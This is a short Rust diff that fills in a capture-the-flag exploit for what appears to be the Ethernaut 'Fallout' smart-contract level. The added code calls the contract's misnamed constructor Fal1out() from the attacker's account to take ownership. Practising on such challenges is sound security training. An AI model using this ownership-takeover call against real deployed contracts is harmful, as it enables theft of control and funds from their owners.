@@ -20,8 +20,17 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &Actor,
     ) -> eyre::Result<()> {
-        // TODO: exploit the level
-        let _ = (target, offender);
+        let contract =
+            Fallout::new(target.address, offender.provider().clone());
+
+        contract
+            .Fal1out()
+            .from(offender.address())
+            .send()
+            .await?
+            .watch()
+            .await?;
+
         Ok(())
     }
 }
